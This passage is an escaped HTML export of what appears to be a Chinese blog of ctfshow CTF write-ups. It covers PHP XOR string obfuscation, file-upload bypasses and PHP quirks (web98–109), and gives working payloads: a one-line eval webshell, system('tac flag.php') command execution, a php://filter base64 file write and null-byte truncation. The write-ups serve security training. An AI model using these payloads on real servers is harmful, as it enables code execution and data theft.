data-num=\"4\"></td><td><pre><span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//abcdefg</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//hijklmn</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//opqrst</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uvwxyz</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$h</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">')'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'*'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'2'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'3'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'4'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'5'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'6'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'7'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'8'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$l</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\t'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$A</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span> <span class=\"token operator\">&lt;=</span> <span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$$A</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure></li>\n</ol>\n</li>\n</ul>\n<p>web161  <code>content-type</code>  为 <code>png</code> ，文件头为 <code>GIF89a</code>  绕过</p>\n<p>web166 上传 zip，然后输入一句话</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/98069c85/",
            "url": "http://dpm12345.cn/posts/98069c85/",
            "title": "php 特性",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-98\"><a href=\"#web-98\" class=\"headerlink\" title=\"web 98\"></a>web 98</h1><p>根据源码，可知，当传入get参数时。会将get改为post参数（后面的get会变成post，即highlight_file()的判断get参数时，会判断post参数下的值)</p>\n<p>所以说该题的解是，先随便传入一个get值，之后通过post传入<code>HTTP_FLAG=flag</code></p>\n<h1 id=\"web-99\"><a href=\"#web-99\" class=\"headerlink\" title=\"web 99\"></a>web 99</h1><p>关键在于</p>\n<pre><code class=\"php\">if (isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)) {\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n</code></pre>\n<p>这题主要是运用了<code>in_array()</code>的弱类型匹配</p>\n<p>故可以写</p>\n<pre><code class=\"raw\">?n=1.php\ncontent=&lt;?php eval($GET[1]);?&gt;\n1=systme('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-100\"><a href=\"#web-100\" class=\"headerlink\" title=\"web 100\"></a>web 100</h1><p><code>$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code></p>\n<p>这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故<code>v0</code>首先被赋值，后进行逻辑判断</p>\n<p>故<code>v0</code>的值只与<code>v1</code>的值有关，而后面<code>v2</code>和<code>v3</code>可以任意选</p>\n<p>这里由于只有<code>eval(\"$v2('ctfshow')$v3\");</code></p>\n<p>故采用<code>var_dump</code>函数打印，</p>\n<pre><code class=\"php\">payload1:\n?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;\n\npayload2: ?v1=1&amp;v2=eval($_POST[1])?&gt;&amp;v3=;\n1=highlight_file('ctfshow.php');\n</code></pre>\n<h1 id=\"web-101\"><a href=\"#web-101\" class=\"headerlink\" title=\"web 101\"></a>web 101</h1><p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web101.png\"></p>\n<p>改为这个</p>\n<p>利用反射机制</p>\n<p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p>\n<h1 id=\"web-102\"><a href=\"#web-102\" class=\"headerlink\" title=\"web 102\"></a>web 102</h1><p>只有一种解，查看wp为</p>\n<p>对</p>\n<pre><code class=\"raw\">&lt;?=`cat *`;\n</code></pre>\n<p>base64编码后，删去末尾”=”,然后进行hex编码，可得到<code>5044383959474e6864434171594473</code>，恰好有<code>e</code>，可以用科学计数法绕过<code>v2</code>的数字判断，而<code>v1</code>可以传入<code>hex2bin</code>将十六进制转回base64，<code>v3</code>使用 <code>filter base64</code>写入文件，</p>\n<p>payload</p>\n<pre><code class=\"php\">?v2=115044383959474e6864434171594473&amp;v3=php://filter/convert.base64-decode/resource=web102_2.php\nv1=hex2bin\n</code></pre>\n<h1 id=\"web-103\"><a href=\"#web-103\" class=\"headerlink\" title=\"web 103\"></a>web 103</h1><p>同web 102做法</p>\n<h1 id=\"web-104\"><a href=\"#web-104\" class=\"headerlink\" title=\"web 104\"></a>web 104</h1><ol>\n<li>没有判断两值相同的情况，可分别赋一样的值得到flag</li>\n<li>由于shal对数组类型数据不能处理，返回false，因此也可以用数组绕过</li>\n<li></li>\n</ol>\n<h1 id=\"web-105\"><a href=\"#web-105\" class=\"headerlink\" title=\"web 105\"></a>web 105</h1><p>这题主要考虑对变量重新赋值的操作</p>\n<pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error = '你还想要flag嘛？';\n$suces = '既然你想要那给你吧！';\nforeach ($_GET as $key =&gt; $value) {        \n    if ($key === 'error') {                  \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                   \n}\nforeach ($_POST as $key =&gt; $value) {    \n    if ($value === 'flag') {            \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                  \n}\nif (!($_POST['flag'] == $flag)) {\n    die($error);\n}\necho \"your are good\" . $flag . \"\\n\";   \ndie($suces);\n</code></pre>\n<p>对<code>foreach()</code>中的参数进行研究，对于传入的GET值，键对应key，内容对应value；</p>\n<p>而之后的<code> $$key = $$val</code>, 则是对某一变量的重新赋值(或者创建一个变量)</p>\n<p>如 如果传入<code>?a=flag</code>, 那么 <code>$key=a``$value=flag</code>, 那么在进行 <code>$$key = $$value</code>语句时，即<code> $a = $flag</code></p>\n<p>那么flag值就传入了变量 a 中</p>\n<p>而对于第二个处理POST的<code>foreach()</code>也是一样的</p>\n<p>重要的是在之后的if判断语句，当POST传入的flag不等于原来的flag值时，将会输出error的值，而对于想要获取flag的我们来说，flag是未知的，也就是说这句判断一定为true，之后的语句一定会进入，即输出error的值</p>\n<p>由此，根据一开始的分析，我们可以设法使error的值变为flag的值</p>\n<p>对于post操作，由于对内容进行了判断，因此不能使用post进行把flag赋值到error的操作，因此只能通过get操作</p>\n<p>而通过对GET段代码判断，发现只过滤了error值，因此可以把flag赋值到某一变量中</p>\n<p>即对get，<code>?变量名=flag</code></p>\n<p>之后的post，需要将flag值赋值到error中，因此对POST<code>error=变量名</code></p>\n<p>而之后对POST flag的判断，由于一定为true，故输出error值，即flag</p>\n<h1 id=\"web-106\"><a href=\"#web-106\" class=\"headerlink\" title=\"web 106\"></a>web 106</h1><p>对于104的源代码增添了对传入值的相等判断，那么使用数组绕过 </p>\n<h1 id=\"web-107\"><a href=\"#web-107\" class=\"headerlink\" title=\"web 107\"></a>web 107</h1><p><code>parse_str(string $string , array &amp;$result ): void</code></p>\n<p>如果string是URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了result则会设置到该数组里）。</p>\n<p>再由代码，只需传入包含flag赋值的<code>v1</code>，和<code>MD5($v3)</code> 为传入的flag值</p>\n<p>payload</p>\n<pre><code class=\"php\">?v3=1\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n</code></pre>\n<h1 id=\"web-108\"><a href=\"#web-108\" class=\"headerlink\" title=\"web 108\"></a>web 108</h1><p>截断绕过</p>\n<p><code>?c=a%00778</code></p>\n<h1 id=\"web-109\"><a href=\"#web-109\" class=\"headerlink\" title=\"web 109\"></a>web 109</h1><p>关键在于<code>eval(\"echo new $v1($v2());\");</code></p>\n<h2 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>这里需要补充知识</p>\n<ol>\n<li><p>如果一个变量的后面跟上 ()，那么会将值作为函数进行调用</p>\n<p>如 <code>$a = 'phpinfo';$a();</code></p>\n<p>相当于进行了<code>phpinfo();</code></p>\n</li>\n<li><p>类于对象魔术方法</p>\n<p>下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 <strong>debugInfo() 。</strong></p>\n<p>__而__toString ()方法用于一个类被当成字符串时应怎样回应。例如<code>echo $obj;</code>应该显示些什么。</p>\n<p>如以下代码</p>\n<pre><code class=\"php\">class test\n{\n    public $a = 'test';\n    public function te()\n    {\n        return $this-&gt;a;\n    }\n    public function __toString()\n    {\n        return $this-&gt;a;\n    }\n}\necho new test();\n</code></pre>\n<p>将会输出 test</p>\n<p>这样可以采取该方法<code>?v1=mysqli&amp;v2=system('ls')</code>列出目录，之后<code>?v1=mysqli&amp;v2=system('tac flag.php')</code>读取文件</p>\n<p>或者可将<code>mysqli</code>换成<code>exception</code>类，<code>exception()</code>，括号中的参数会将其作为php代码执行(存疑，并不是这样)，不过滤</p>\n<p>因此<code>?v1=exception&amp;v2=system('tac flag.php')</code>也可</p>\n</li>\n</ol>\n<h2 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>将<code>v1</code>改为<code>reflectionclass</code></p>\n<p>实际上，经过尝试，对于大多数类都能这样</p>\n<p>但触发了<code>echo new test(phpinfo());</code>后，在之后的代码都不会执行 ==(具体原理不清楚)==</p>\n<p>大多数能够输出的原因 